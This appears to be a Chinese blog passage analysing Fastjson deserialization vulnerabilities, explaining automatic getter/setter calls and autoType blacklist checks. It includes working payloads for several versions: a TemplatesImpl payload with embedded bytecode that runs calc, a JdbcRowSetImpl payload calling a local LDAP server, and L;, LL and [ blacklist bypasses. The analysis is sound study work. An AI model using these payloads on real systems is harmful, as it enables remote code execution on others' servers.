&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>创建测试test类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;enjoy&quot;</span>, <span class="hljs-number">18</span>, <span class="hljs-string">&quot;学习&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> JSON.toJSONString(user);<br>        <span class="hljs-comment">//String s2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br>        System.out.println(s1);<br>        <span class="hljs-comment">//System.out.println(s2);</span><br>        System.out.println(<span class="hljs-string">&quot;----------------------------&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(s1);<br>        System.out.println(parse);<br>        System.out.println(parse.getClass().getName());<br>        System.out.println(<span class="hljs-string">&quot;----------------------------&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse1</span> <span class="hljs-operator">=</span> JSON.parseObject(s1);<br>        System.out.println(parse1);<br>        System.out.println(parse1.getClass().getName());<br>        System.out.println(<span class="hljs-string">&quot;----------------------------&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse2</span> <span class="hljs-operator">=</span> JSON.parseObject(s1, Object.class);<br>        System.out.println(parse2);<br>        System.out.println(parse2.getClass().getName());<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>结果如下</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230422105124784.png" alt="image-20230422105124784"> </p><p>其中<code>JSON.toJSONString(user)</code>的功能为将类转换为json字符串，并且在<strong>转换的同时调用了get方法</strong>这是fastjson反序列中一个重要的点，这里先记住后面在解释</p><p>接着往下看，看下面三行代码，它们输出结果一致，其功能都为将json字符串转化为一个类，且都会转换为<code>JSONObject</code>类，但实则他们的具体实现肯定不一样，<code>parse</code>会转换为<code>@type</code>指定的类，<code>parseObject</code>会默认指定<code>JSONObject</code>类，而在<code>parseObject</code>参数中加一个类参数则会转换为其指定的类（这里指定Object会自动转化为JSONObject）</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>parse(s1)<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>parse<span class="hljs-constructor">Object(<span class="hljs-params">s1</span>)</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>parse<span class="hljs-constructor">Object(<span class="hljs-params">s1</span>,Object.<span class="hljs-params">class</span>)</span><br></code></pre></td></tr></table></figure><p>接下来把测试类test中的注释去掉，且将parse和parseObject的参数改为s2，再来看一下运行结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;enjoy&quot;</span>, <span class="hljs-number">18</span>, <span class="hljs-string">&quot;学习&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span>JSON.toJSONString(user, SerializerFeature.WriteClassName);<br><br>        System.out.println(s2);<br>        System.out.println(<span class="hljs-string">&quot;----------------------------&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(s2);<br>        System.out.println(parse);<br>        System.out.println(parse.getClass().getName());<br>        System.out.println(<span class="hljs-string">&quot;----------------------------&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse1</span> <span class="hljs-operator">=</span> JSON.parseObject(s2);<br>        System.out.println(parse1);<br>        System.out.println(parse1.getClass().getName());<br>        System.out.println(<span class="hljs-string">&quot;----------------------------&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse2</span> <span class="hljs-operator">=</span> JSON.parseObject(s2, Object.class);<br>        System.out.println(parse2);<br>        System.out.println(parse2.getClass().getName());<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230422144133781.png" alt="image-20230422144133781">  </p><p>先来看第一部分，调用了两次get方法这是因为调用了两次<code>toJSONString</code></p><p>第二部分，parse进行反序列化，因此json字符串中<strong>有<code>@type</code>因此会自动执行指定类的set方法</strong>，并且会转换为<code>@type</code>指定类的类型</p><p>第三部分，<strong>parseObject进行反序列话时会自动执行<code>@type</code>指定类的get和set方法</strong>，并且转换为<code>JSONObject</code>类</p><p>我们来看一下源码就明白了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title function_">parseObject</span><span class="hljs-params">(String text)</span> &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> parse(text);<br>    <span class="hljs-keyword">return</span> obj <span class="hljs-keyword">instanceof</span> JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);<br>&#125;<br></code></pre></td></tr></table></figure><p>其实相当于封装了一个parse，先进行了parse然后执行<code>toJSON</code>并且强制转换为<code>JSONObject</code>类<br>其中parse会调用set方法，toJSON会调用get方法</p><p>第四部分，虽然我们指定了类为<code>Object</code>类，但是我们传进去的json字符串中有<code>@type</code>指定的类导致其会转换为其指定的类，那这样我们指定类岂不是多余？接下来我们直接通过代码调试来看一下这个问题</p><p>重新建了一个UserTest类，并且将json字符串改为没有加<code>@type</code>的<code>s1</code>并且指定类型为我们新建的userTest类，然后输出结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;enjoy&quot;</span>, <span class="hljs-number">18</span>, <span class="hljs-string">&quot;学习&quot;</span>);<br>        <span class="hljs-type">UserTest</span> <span class="hljs-variable">usertest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserTest</span>(<span class="hljs-string">&quot;enjoy&quot;</span>, <span class="hljs-number">18</span>, <span class="hljs-string">&quot;学习&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span>JSON.toJSONString(user);<br><br>        System.out.println(s2);<br>        System.out.println(<span class="hljs-string">&quot;----------------------------&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(s2);<br>        System.out.println(parse);<br>        System.out.println(parse.getClass().getName());<br>        System.out.println(<span class="hljs-string">&quot;----------------------------&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse1</span> <span class="hljs-operator">=</span> JSON.parseObject(s2);<br>        System.out.println(parse1);<br>        System.out.println(parse1.getClass().getName());<br>        System.out.println(<span class="hljs-string">&quot;----------------------------&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse2</span> <span class="hljs-operator">=</span> JSON.parseObject(s2, UserTest.class);<br>        System.out.println(parse2);<br>        System.out.println(parse2.getClass().getName());<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看到这个正是正常的结果</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230422144808340.png" alt="image-20230422144808340">  </p><p>加入没替换掉前面的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span>JSON.toJSONString(user, SerializerFeature.WriteClassName);<br></code></pre></td></tr></table></figure><p>出现报错</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230422144941857.png" alt="image-20230422144941857"> </p><p>我们直接到出现问题的地方下断点</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230422155710614.png" alt="image-20230422155710614"> </p><p>看这里的条件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; (userType == <span class="hljs-literal">null</span> || !expectClass.isAssignableFrom(userType))) &#123;<br>                                                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match&quot;</span>);<br>                                                        &#125;<br></code></pre></td></tr></table></figure><p>如果 <code>expectClass</code> 不为 <code>null</code>，并且满足以下任一条件：</p><ul><li><code>userType</code> 为 <code>null</code></li><li><code>userType</code> 不是 <code>expectClass</code> 的子类或子接口</li></ul><p>则会抛出一个 <code>JSONException</code> 异常，异常信息为 “type not match”。</p><p>因此是前面指类的时候指错了</p><h2 id="TYPE的指向为何无效"><a href="#TYPE的指向为何无效" class="headerlink" title="@TYPE的指向为何无效"></a>@TYPE的指向为何无效</h2><p>回到一开始的问题，为什么指定了<code>Object</code>类后输出结果却为<code>@type</code>指定的类型，直接调试发现了在<code>com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer#deserialze</code>中进行了对type的判断也就是一开始传的Object.class，会首先判断是否是类，然后如果是<code>Object.class</code>和<code>Serializable.class</code>的话会直接进入到<code>parser.parse(fieldName)</code>中</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230422213056200.png" alt="image-20230422213056200"> </p><p>也就是说当我们指定<code>@type</code>为恶意类时，并且其getter&#x2F;setter有着一定危害时，就会出现无法预估的危害，重点就在于其会自动执行getter&#x2F;setter，简单的来解释下原理就是<strong>通过反射调用get方法获取值，相应的就是通过反射调用set方法存储值</strong>，其中getter自动调用还需要满足以下条件：</p><ul><li>方法名长度大于4</li><li>非静态方法</li><li>以get开头且第四个字母为大写</li><li>无参数传入</li><li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li></ul><p>setter自动调用需要满足以下条件：</p><ul><li>方法名长度大于4</li><li>非静态方法</li><li>返回值为void或者当前类</li><li>以set开头且第四个字母为大写</li><li>参数个数为1个</li></ul><p>除此之外Fastjson还有以下功能点：</p><ol><li>如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用<code>Feature.SupportNonPublicField</code>参数</li><li>fastjson 在为类属性寻找getter&#x2F;setter方法时，调用函数<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code>方法，会忽略<code>_ -</code>字符串</li><li>fastjson 在反序列化时，如果Field类型为byte[]，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code>进行base64解码，在序列化时也会进行base64编码</li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h3><p>在这个版本中有两条链子：</p><ol><li><p>com.sun.rowset.JdbcRowSetImpl</p></li><li><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</p></li></ol><h4 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h4><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230422165130450.png" alt="image-20230422165130450"> </p><p>这里注意一点，jdk版本需要满足 8u161 &lt; jdk &lt; 8u191</p><p>成功收到请求</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230424184631193.png" alt="image-20230424184631193"> </p><h4 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h4><p>这一条其实就是CC链条的知识，需要注意的是因为要用到的变量都是private的需要在反序列化时加上<code>Feature.SupportNonPublicField</code>参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Exploit;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String string=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAR0ZXN0AQAMSW5uZXJDbGFzc2VzAQAiTGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0OwEAClNvdXJjZUZpbGUBAAxKREs3dTIxLmphdmEMAAQABQcAEwEAIGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0AQAQamF2YS9sYW5nL09iamVjdAEAG2NvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMQEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACEKACIADwAhAAIAIgAAAAAAAgABAAQABQABAAYAAAAvAAEAAQAAAAUqtwAjsQAAAAIABwAAAAYAAQAAACoACAAAAAwAAQAAAAUACQAMAAAACAAUAAUAAQAGAAAAFgACAAAAAAAKuAAaEhy2ACBXsQAAAAAAAgANAAAAAgAOAAsAAAAKAAEAAgAQAAoACQ==\&quot;],&#x27;_name&#x27;:&#x27;exp&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;<br>        JSON.parse(string, Feature.SupportNonPublicField);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230424185317333.png" alt="image-20230424185317333"> </p><h3 id="1-2-25"><a href="#1-2-25" class="headerlink" title="1.2.25"></a>1.2.25</h3><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230424191220796.png" alt="image-20230424191220796"> </p><p>在parseConfig中，可以看到黑名单内容，并设置了<code>autotypesupport</code>用来控制是否可以反序列化，<code>autoTypeSupport</code>默认为<code>false</code>且禁止反序列化，为true时会使用<code>checkAutoType</code>来进行安全检测</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230424191420823.png" alt="image-20230424191420823"> </p><p>而后面有对className与黑名单比较，如果在黑名单里面就抛出<code>autoType is not support</code></p><p>随后介绍了type not match，在clazz为空的情况下通过TypeUtil.loadClass来加载我们的typeName</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230424192623886.png" alt="image-20230424192623886"> </p><p>在<code>TypeUtils.loadClass</code>中，可以看到对<code>[ L ;</code>进行了处理，而其中在处理<code>L ;</code><br>的时候存在了逻辑漏洞，如果以<code>L</code>开头并以<code>;</code>结尾的话就会直接加载这个类可以在<code>@type</code>的前后分别加上<code>L ;</code>来进行绕过</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230424192838965.png" alt="image-20230424192838965"> </p><p>因为下面图中只有当autotypesupport为true时，他才会调用<code>loadclass</code>方法，于是构造payload时令其为true</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//开启autoTypeSupport</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/foo&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><p><code>getGlobalInstance()</code> 是该类的一个静态方法，用于获取全局共享的 <code>ParserConfig</code> 实例化对象。</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230424193836914.png" alt="image-20230424193836914"> </p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230424193843396.png" alt="image-20230424193843396"> </p><p>成功执行</p><h3 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h3><p>在此版本中，将黑名单改为了hashcode，但是在<code>com.alibaba.fastjson.util.TypeUtils#fnv1a_64</code>中有hashcode的计算方法，然后在<code>checkAutoType</code>中，使用hashcode对<code>L ;</code>进行了截取，然后进入到<code>TypeUtils.loadClass</code>中，也就是说对<code>L ;</code>进行双写即可绕过</p><p>主要原理在于这一段语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br>    <span class="hljs-keyword">if</span> (typeName == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (typeName.length() &lt; <span class="hljs-number">128</span> &amp;&amp; typeName.length() &gt;= <span class="hljs-number">3</span>) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        Class&lt;?&gt; clazz = <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">BASIC</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3750763034362895579L</span>;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">PRIME</span> <span class="hljs-operator">=</span> <span class="hljs-number">1099511628211L</span>;<br>        <span class="hljs-keyword">if</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(className.length() - <span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655701488918567152L</span>) &#123;<br>            className = className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><p>解释一下第二个if语句</p><ol><li>从 <code>className</code> 字符串的第一个字符（<code>className.charAt(0)</code>）获取一个字符，并将其转换为 <code>long</code> 类型。</li><li>将上一步得到的字符与常量 <code>-3750763034362895579L</code> 进行位异或操作（<code>^</code>）。</li><li>将上一步的结果与常量 <code>1099511628211L</code> 相乘（<code>*</code>）。</li><li>从 <code>className</code> 字符串的最后一个字符（<code>className.charAt(className.length() - 1)</code>）获取一个字符，并将其转换为 <code>long</code> 类型。</li><li>将上一步得到的字符与上一步的结果进行位异或操作（<code>^</code>）。</li><li>将上一步的结果与常量 <code>1099511628211L</code> 相乘（<code>*</code>）。</li><li>将上一步的结果与常量 <code>655701488918567152L</code> 进行比较，判断是否相等。</li></ol><p>如果上述计算得到的结果等于 <code>655701488918567152L</code>，则进入 if 语句的代码块，将 <code>className</code> 字符串从第一个字符开始（<code>substring(1, className.length() - 1)</code>）截取到倒数第二个字符，将结果赋值给 <code>className</code>。这样，实际处理的 <code>className</code> 字符串将去掉了开头和结尾的字符。</p><p>也就是说他掐头去尾，那我们可以进行双写绕过</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230424202204038.png" alt="image-20230424202204038"> </p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230424202212858.png" alt="image-20230424202212858"> </p><p>成功执行</p><p>通过debug可以发现typename最终被处理成classname，而classname就是我们上一个版本的绕过</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230424202438242.png" alt="image-20230424202438242"> </p><p>该payload在前几个版本也可以使用，影响版本<code>1.2.25 &lt;= fastjson &lt;= 1.2.43</code></p><h3 id="1-2-43"><a href="#1-2-43" class="headerlink" title="1.2.43"></a>1.2.43</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (typeName == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (typeName.length() &lt; <span class="hljs-number">128</span> &amp;&amp; typeName.length() &gt;= <span class="hljs-number">3</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>            Class&lt;?&gt; clazz = <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">BASIC</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3750763034362895579L</span>;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">PRIME</span> <span class="hljs-operator">=</span> <span class="hljs-number">1099511628211L</span>;<br>            <span class="hljs-keyword">if</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(className.length() - <span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655701488918567152L</span>) &#123;<br>                <span class="hljs-keyword">if</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655656408941810501L</span>) &#123;<span class="hljs-comment">//这里加了一层嵌套判断</span><br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                &#125;<br><br>                className = className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<br>            &#125;<br></code></pre></td></tr></table></figure><p>在此版本中,<code>checkAutoType</code>对<code>LL</code>进行了判断，如果类以<code>LL</code>开头，则直接抛出异常</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230424204042194.png" alt="image-20230424204042194"> </p><p>因为之前说过之前Loadclass也会对<code>[</code>进行解析，那我们尝试通过[来绕过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="hljs-number">1</span>), classLoader);<br>    <span class="hljs-keyword">return</span> Array.newInstance(componentType, <span class="hljs-number">0</span>).getClass();<br></code></pre></td></tr></table></figure><p>发现和之前一样都是从[后面开始截取，那尝试加一个[</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">String str=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/foo\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230424204505847.png" alt="image-20230424204505847"> </p><p>抛出异常，我们找到42，加上[</p><p><img 